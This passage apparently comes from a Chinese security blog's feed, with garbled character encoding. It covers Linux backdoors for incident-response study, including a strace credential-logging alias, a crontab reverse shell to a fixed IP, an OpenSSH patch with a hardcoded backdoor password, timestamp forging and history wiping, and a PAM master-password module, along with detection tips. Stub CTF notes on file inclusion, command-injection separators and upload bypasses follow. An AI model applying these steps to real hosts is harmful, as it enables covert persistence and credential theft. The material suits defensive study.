&#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line">å¯é€šè¿‡é‡è£…sshæœåŠ¡æ¢å¤ã€‚</span><br></pre></td></tr></table></figure><p><strong>6ã€straceåé—¨</strong></p><p>é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure><p><strong>7ã€crontabåå¼¹shell</strong></p><p>crontabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚æ–°å»ºshellè„šæœ¬ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹ã€‚</p><p>aã€åˆ›å»ºshellè„šæœ¬ï¼Œä¾‹å¦‚åœ¨/etc/evil.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.28.131&#x2F;12345  0&gt;&amp;1</span><br><span class="line">chmod +sx &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure><p>bã€crontab -e è®¾ç½®å®šæ—¶ä»»åŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure><p><strong>8ã€opensshåé—¨</strong></p><p>åˆ©ç”¨opensshåé—¨ï¼Œè®¾ç½®SSHåé—¨å¯†ç åŠrootå¯†ç è®°å½•ä½ç½®ï¼Œéšè”½æ€§è¾ƒå¼ºï¼Œä¸æ˜“è¢«å‘ç°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">aã€å¤‡ä»½SSHé…ç½®æ–‡ä»¶</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line"></span><br><span class="line">bã€è§£å‹å¹¶å®‰è£…è¡¥ä¸</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff  &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">cã€è®°å½•ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶ä½ç½®åŠå…¶å¯†ç </span><br><span class="line">vi  includes.h</span><br><span class="line">    #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;             &#x2F;&#x2F;è®°å½•ç™»å½•æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">    #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;             &#x2F;&#x2F;è®°å½•æœ¬æœºç™»å½•è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">    #define SECRETPW &quot;123456789&quot;          &#x2F;&#x2F;åé—¨çš„å¯†ç </span><br><span class="line"></span><br><span class="line">dã€ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">vi version.h</span><br><span class="line">    #define SSH_VERSION &quot;å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬&quot;</span><br><span class="line">    #define SSH_PORTABLE &quot;å°ç‰ˆæœ¬å·&quot;</span><br><span class="line"></span><br><span class="line">eã€å®‰è£…å¹¶ç¼–è¯‘</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">fã€å¯¹æ¯”åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ä¸€è‡´ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æ—¥æœŸã€‚</span><br><span class="line"></span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">gã€æ¸…é™¤æ“ä½œè®°å½•</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;æ¸…ç©ºæ“ä½œæ—¥å¿—</span><br></pre></td></tr></table></figure><p>æ’æŸ¥æŠ€å·§ï¼šåˆ©ç”¨straceæ‰¾å‡ºsshåé—¨.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1ã€è·å–å¯ç–‘è¿›ç¨‹PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2ã€è·Ÿè¸ªsshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3ã€æŸ¥çœ‹è®°å½•å¯†ç æ‰“å¼€æ–‡ä»¶</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br></pre></td></tr></table></figure><p><strong>9ã€PAMåé—¨</strong></p><p>PAM ï¼ˆPluggable Authentication Modules ï¼‰æ˜¯ç”±Sunæå‡ºçš„ä¸€ç§è®¤è¯æœºåˆ¶ã€‚å®ƒé€šè¿‡æä¾›ä¸€äº›åŠ¨æ€é“¾æ¥åº“å’Œä¸€å¥—ç»Ÿä¸€çš„APIï¼Œå°†ç³»ç»Ÿæä¾›çš„æœåŠ¡å’Œè¯¥æœåŠ¡çš„è®¤è¯æ–¹å¼åˆ†å¼€ï¼Œä½¿å¾—ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥çµæ´»åœ°æ ¹æ®éœ€è¦ç»™ä¸åŒçš„æœåŠ¡é…ç½®ä¸åŒçš„è®¤è¯æ–¹å¼è€Œæ— éœ€æ›´æ”¹æœåŠ¡ç¨‹åºï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå‘ç³»ç»Ÿä¸­æ·»åŠ æ–°çš„è®¤è¯æ‰‹æ®µã€‚PAMæœ€åˆæ˜¯é›†æˆåœ¨Solarisä¸­ï¼Œç›®å‰å·²ç§»æ¤åˆ°å…¶å®ƒç³»ç»Ÿä¸­ï¼Œå¦‚Linuxã€SunOSã€HP-UX 9.0ç­‰ã€‚</p><p>åˆ©ç”¨æ–¹æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ã€è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„PAMç‰ˆæœ¬ï¼Œä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„pamç‰ˆæœ¬</span><br><span class="line">2ã€è§£å‹ç¼©ï¼Œä¿®æ”¹pam_unix_auth.cæ–‡ä»¶ï¼Œæ·»åŠ ä¸‡èƒ½å¯†ç </span><br><span class="line">3ã€ç¼–è¯‘å®‰è£…PAM</span><br><span class="line">4ã€ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨ï¼šmodules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.soï¼Œå¤åˆ¶åˆ°&#x2F;lib64&#x2F;securityä¸­è¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†ï¼Œå¹¶å°†ç”¨æˆ·åå¯†ç è®°å½•åˆ°æ–‡ä»¶ä¸­ã€‚</span><br></pre></td></tr></table></figure><p>æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1ã€é€šè¿‡Straceè·Ÿè¸ªssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2ã€æ£€æŸ¥pam_unix.soçš„ä¿®æ”¹æ—¶é—´</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32ä½</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64ä½</span><br></pre></td></tr></table></figure><p><strong>10ã€rookitåé—¨</strong></p><p>Mafixæ˜¯ä¸€æ¬¾å¸¸ç”¨çš„è½»é‡åº”ç”¨çº§åˆ«Rootkitsï¼Œæ˜¯é€šè¿‡ä¼ªé€ sshåè®®æ¼æ´å®ç°è¿œç¨‹ç™»é™†çš„ç‰¹ç‚¹æ˜¯é…ç½®ç®€å•å¹¶å¯ä»¥è‡ªå®šä¹‰éªŒè¯å¯†ç å’Œç«¯å£å·ã€‚</p><p>åˆ©ç”¨æ–¹æ³•ï¼šå®‰è£…å®Œæˆåï¼Œä½¿ç”¨ssh ç”¨æˆ·@IP -P é…ç½®çš„ç«¯å£ï¼Œå³å¯è¿œç¨‹ç™»å½•ã€‚</p><p>æ’æŸ¥æŠ€å·§ï¼šæŸ¥çœ‹ç«¯å£æ˜¯å¦å¼‚å¸¸ï¼ŒRPM checkæŸ¥çœ‹å‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>LINUXçš„ä¸¤ç§åé—¨æ€»ç»“(suid shellä¸inetd)</p><p><a href="https://www.cnblogs.com/milantgh/p/3601812.html">https://www.cnblogs.com/milantgh/p/3601812.html</a></p><p>linuxåé—¨æ€»ç»“</p><p><a href="https://www.cnblogs.com/zaqzzz/p/12099463.html">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p><p><a href="https://www.secpulse.com/archives/100484.html">https://www.secpulse.com/archives/100484.html</a></p><p>linuxå„ç§ä¸€å¥è¯åå¼¹shellæ€»ç»“</p><p><a href="https://yq.aliyun.com/articles/519250?type=2">https://yq.aliyun.com/articles/519250?type=2</a></p><p>Linux OpenSSHåé—¨çš„æ·»åŠ ä¸é˜²èŒƒ</p><p><a href="https://yq.aliyun.com/articles/69350">https://yq.aliyun.com/articles/69350</a></p><p>Linuxåé—¨æ•´ç†åˆé›†</p><p><a href="https://www.cnblogs.com/maplered/p/9224617.html">https://www.cnblogs.com/maplered/p/9224617.html</a></p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p><p>linux åé—¨</p><p><a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p><h1 id="Linux-å®æˆ˜"><a href="#Linux-å®æˆ˜" class="headerlink" title="Linux å®æˆ˜"></a>Linux å®æˆ˜</h1><p><a href="https://bypass007.github.io/Emergency-Response-Notes/Linux/">https://bypass007.github.io/Emergency-Response-Notes/Linux/</a></p><p>å…¶ä»–å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ">https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‰è¨€ï¼š2020å¹´æœŸé—´æœ‰å¹¸å‚åŠ äº†æŠ¤ç½‘ï¼Œå®¢æˆ·åœ¨æ¼”ä¹ é˜¶æ®µå‡ºç°äº†ä¸€æ¬¡åº”æ€¥äº‹ä»¶ï¼ŒWindowsçš„é‚®ä»¶æœåŠ¡å™¨å‡ºç°äº†ä¸€ä¸ªéšè—ç”¨æˆ·å¼‚åœ°ç™»å½•â€¦â€¦ å½“æ—¶å®¢æˆ·æœ‰ç‚¹æƒ…ç»ªï¼ŒåŠ ä¹‹æˆ‘ä»¬è¿™è¾¹ç¡®å®éƒ½æ˜¯æ“…é•¿æ¸—é€ã€æŒ–æ´çš„å¸ˆå‚…ä»¬ï¼Œæ‰€ä»¥åº”æ€¥çš„æ—¶å€™æ˜¾å¾—å¾ˆé™Œç”Ÿï¼Œæ‰‹å¿™è„šä¹±ï¼Œç”šè‡³å¯ä»¥è¯´å¾ˆä¸šä½™ã€‚äºæ˜¯</summary>
      
    
    
    
    
    <category term="Linuxåº”æ€¥å“åº”" scheme="https://hack-for.fun/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>CTF - æ–‡ä»¶åŒ…å«</title>
    <link href="https://hack-for.fun/7881c78e.html"/>
    <id>https://hack-for.fun/7881c78e.html</id>
    <published>2020-09-02T16:40:30.000Z</published>
    <updated>2020-09-05T13:26:04.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹"></a>æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹</h1><p>å¤šæ•°æƒ…å†µæ­¤å¤„åªè€ƒè™‘phpå¼€å‘çš„åç«¯ç½‘ç«™ã€CTF èµ›é¢˜ã€‚</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h3><p>php ä¸­ï¼Œä¸æ–‡ä»¶åŒ…å«ç›¸å…³çš„å‡½æ•°</p><p>require()<br>require_once()<br>include()<br>include_once()</p><h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><ul><li>allow_url_open = on</li></ul><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><h3 id="ååºåˆ—åŒ–-SSRF-gt-æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–"><a href="#ååºåˆ—åŒ–-SSRF-gt-æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–" class="headerlink" title="(ååºåˆ—åŒ–)SSRF -&gt; æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–"></a>(ååºåˆ—åŒ–)SSRF -&gt; æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–</h3><h3 id="æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="æ—¥å¿—æ–‡ä»¶åŒ…å«"></a>æ—¥å¿—æ–‡ä»¶åŒ…å«</h3><h3 id="ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><h3 id="session-æ–‡ä»¶åŒ…å«"><a href="#session-æ–‡ä»¶åŒ…å«" class="headerlink" title="session æ–‡ä»¶åŒ…å«"></a>session æ–‡ä»¶åŒ…å«</h3><h1 id="Tomcat-Ajp-æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´"><a href="#Tomcat-Ajp-æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="Tomcat Ajp æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´"></a>Tomcat Ajp æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´</h1><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;/a&gt;æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&lt;/h1&gt;&lt;p&gt;å¤šæ•°æƒ…å†µæ­¤å¤„åªè€ƒè™‘phpå¼€å‘çš„åç«¯ç½‘ç«™ã€CTF èµ›é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸºç¡€</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF - RCE</title>
    <link href="https://hack-for.fun/dbb484a9.html"/>
    <id>https://hack-for.fun/dbb484a9.html</id>
    <published>2020-08-30T14:20:10.000Z</published>
    <updated>2020-09-02T16:37:39.549Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹"><a href="#RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹" class="headerlink" title="RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´æŠ€æœ¯ç‚¹"></a>RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´æŠ€æœ¯ç‚¹</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æºç ç¼–å†™é€»è¾‘ä¸ä¸¥ï¼Œå‚æ•°å…¥å£è¿‡æ»¤ä¸ä¸¥æˆ–è€…æ²¡è¿‡æ»¤ã€‚</p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ul><li>å­˜åœ¨æ“ä½œè€…å¯æ§çš„è¾“å…¥</li><li>å­˜åœ¨å¯æ‰§è¡Œä»»æ„ä»£ç çš„å±é™©å‡½æ•°ï¼ˆé€šè¿‡å„ç§æ‰‹æ®µï¼ŒåŒ…æ‹¬ä¸å®‰å…¨çš„ååºåˆ—åŒ–ã€‚</li><li>å­˜åœ¨å¯æ‰§è¡Œè¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£</li></ul><h2 id="Linux-ã€Windows-ç®¡é“ç¬¦"><a href="#Linux-ã€Windows-ç®¡é“ç¬¦" class="headerlink" title="Linux ã€Windows ç®¡é“ç¬¦"></a>Linux ã€Windows ç®¡é“ç¬¦</h2><p>Windows ç³»ç»Ÿç®¡é“ç¬¦</p><ul><li>â€œ|â€ ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚eg: ping 127.0.0.1|whoami</li><li>â€œ||â€ï¼šå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ã€‚å‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡ï¼Œeg: ping 2||whoami</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200831112903.png" alt="image-20200831105326087"></p><ul><li>â€œ&amp;â€ï¼šå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚eg: ping 127.0.0.1&amp;whoam</li><li>â€œ&amp;&amp;â€ ï¼šå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢è¯­å¥åªèƒ½ä¸ºçœŸã€‚eg : ping 127.0.0.1&amp;&amp;whoami</li></ul><p>Linux ç³»ç»Ÿç®¡é“ç¬¦</p><p>åŒºåˆ«ä¸å¤§ï¼Œè¿™é‡Œåªåˆ—å‡ºä¸åŒçš„ã€‚</p><ul><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚eg : ping 127.0.0.1;whoami</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥æ‰§è¡Œçš„ç»“æœã€‚eg: ping 127.0.0.1|whoami</li></ul><h2 id="PHP-å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°"><a href="#PHP-å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°" class="headerlink" title="PHP å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°"></a>PHP å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°</h2><blockquote><p>PHP å…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œ</p></blockquote><p><a href="https://hack-for.fun/d8714939.html#RCE">https://hack-for.fun/d8714939.html#RCE</a></p><ul><li>eval</li><li>assert</li><li>preg_replace() + /eï¼ˆphp &lt; 5.5.0) ä¸‹å¯¹æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œ(ä»¥evalçš„å½¢å¼)ä»£ç æ‰§è¡Œ ï¼ˆphpé«˜ç‰ˆæœ¬å·²ç»åºŸé™¤</li><li>create_function å›è°ƒä»£ç æ‰§è¡Œ</li><li>system() exec() ,shell_exec,passthru.pcntl_exec,popen,proc_popen ç­‰ç”¨äºæ‰§è¡Œå¤–éƒ¨ç¨‹åºçš„<code>command</code>å‘½ä»¤</li><li>åå¼•å·å‘½ä»¤æ‰§è¡Œ</li></ul><hr><p>ä¸€äº›é«˜çº§æŠ€å·§ï¼š</p><ul><li>é™åˆ¶å­—ç¬¦é•¿åº¦RCE</li><li>æ— å‚æ•°RCE</li><li>æ— å­—æ¯æ•°å­— webshell</li></ul><h2 id="å…¶ä»–è¯­è¨€ï¼ˆPython-JAVA"><a href="#å…¶ä»–è¯­è¨€ï¼ˆPython-JAVA" class="headerlink" title="å…¶ä»–è¯­è¨€ï¼ˆPython, JAVA"></a>å…¶ä»–è¯­è¨€ï¼ˆPython, JAVA</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>subprocess æ¨¡å—</p><p>å¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„ç›¸å…³æ¨¡å—å’Œå‡½æ•°æœ‰ï¼š</p><p>os.system<br>os.spawn<br>os.popen â€“åºŸå¼ƒ<br>popen2.* â€“åºŸå¼ƒ<br>commands.* â€“åºŸå¼ƒï¼Œ3.xä¸­è¢«ç§»é™¤</p><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;a href=&quot;#RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;/a&gt;RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF - æ–‡ä»¶ä¸Šä¼ </title>
    <link href="https://hack-for.fun/103ec22a.html"/>
    <id>https://hack-for.fun/103ec22a.html</id>
    <published>2020-08-30T13:01:05.000Z</published>
    <updated>2020-08-31T02:25:04.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹</h1><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/">http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</a></p></blockquote><p>CheckFile åˆ†ä¸ºCå‰ç«¯å’ŒSåç«¯ï¼š</p><ul><li>å‰ç«¯ç»•è¿‡ç›´æ¥BP æŠ“åŒ…å°±å¯ä»¥äº† ã€æˆ–è€…åœ¨æµè§ˆå™¨çš„Console é‡Œå°†CheckFile() å‡½æ•°ç½®ç©ºï¼ˆç›¸å½“äºåˆ é™¤ã€‚</li><li>åç«¯æ£€æµ‹ä¸»è¦é’ˆå¯¹æ–‡ä»¶åç¼€ï¼Œæ–‡ä»¶å†…å®¹ï¼Œä»¥åŠContent-Typeï¼ŒMIMI-Type ï¼Œè¾ƒéš¾çš„æœ‰äºŒæ¬¡æ¸²æŸ“ï¼Œæ•°ç»„ç»•è¿‡ï¼Œé€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ç»•è¿‡ï¼Œç•¸å½¢è§£æã€‚</li></ul><h2 id="å¯è§£æåç¼€"><a href="#å¯è§£æåç¼€" class="headerlink" title="å¯è§£æåç¼€"></a>å¯è§£æåç¼€</h2><p>CTFæ–‡ä»¶ä¸Šä¼ é¢˜ä¸­å¸¸ç”¨çš„phpæ‹“å±•å:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200830214608.png" 